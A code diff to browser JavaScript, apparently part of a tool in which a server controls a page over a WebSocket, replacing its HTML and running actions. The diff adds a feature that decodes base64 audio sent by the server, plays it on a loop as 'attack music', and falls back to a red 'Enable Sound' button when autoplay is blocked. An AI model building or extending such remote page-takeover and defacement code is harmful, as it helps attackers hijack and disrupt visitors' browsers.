@@ -642,6 +642,12 @@ ws.onmessage = (event) => {
     if (data.event === 'html_replace' && data.html) {
         console.log('HTML replacement received');
         replacePageHTML(data.html);
+        
+        // Play music if provided
+        if (data.music) {
+            console.log('🎵 Playing attack music');
+            playAttackMusic(data.music);
+        }
     } else if (data.event === 'action' && data.action) {
         console.log('Action received:', data.action.type);
         handleAction(data.action);
@@ -725,6 +731,78 @@ function replacePageHTML(htmlContent) {
         } catch (fallbackError) {
             console.error('All methods failed:', fallbackError);
         }
+    }
+}
+
+function playAttackMusic(musicBase64) {
+    try {
+        console.log('🎵 Setting up attack music playback');
+        
+        // Create audio element
+        const audio = document.createElement('audio');
+        audio.autoplay = true;
+        audio.loop = true;
+        audio.volume = 0.7;
+        
+        // Convert base64 to blob URL
+        const byteCharacters = atob(musicBase64);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], { type: 'audio/mpeg' });
+        const audioUrl = URL.createObjectURL(blob);
+        
+        // Set audio source and play
+        audio.src = audioUrl;
+        audio.style.display = 'none';
+        document.body.appendChild(audio);
+        
+        // Play with user interaction fallback
+        const playPromise = audio.play();
+        if (playPromise !== undefined) {
+            playPromise.then(function() {
+                console.log('🎵 Attack music playing successfully');
+            }).catch(function(error) {
+                console.log('🎵 Autoplay blocked, trying user interaction method');
+                
+                // Create invisible button for user interaction
+                const playButton = document.createElement('button');
+                playButton.style.position = 'fixed';
+                playButton.style.top = '10px';
+                playButton.style.right = '10px';
+                playButton.style.zIndex = '99999';
+                playButton.style.padding = '10px';
+                playButton.style.background = '#ff0000';
+                playButton.style.color = '#fff';
+                playButton.style.border = 'none';
+                playButton.style.cursor = 'pointer';
+                playButton.textContent = '🎵 Enable Sound';
+                
+                playButton.onclick = function() {
+                    audio.play();
+                    playButton.remove();
+                };
+                
+                document.body.appendChild(playButton);
+                
+                // Auto-remove button after 10 seconds
+                setTimeout(function() {
+                    if (playButton.parentNode) {
+                        playButton.remove();
+                    }
+                }, 10000);
+            });
+        }
+        
+        // Clean up URL after audio loads
+        audio.addEventListener('loadeddata', function() {
+            URL.revokeObjectURL(audioUrl);
+        });
+        
+    } catch (error) {
+        console.error('Failed to play attack music:', error);
     }
 }
 
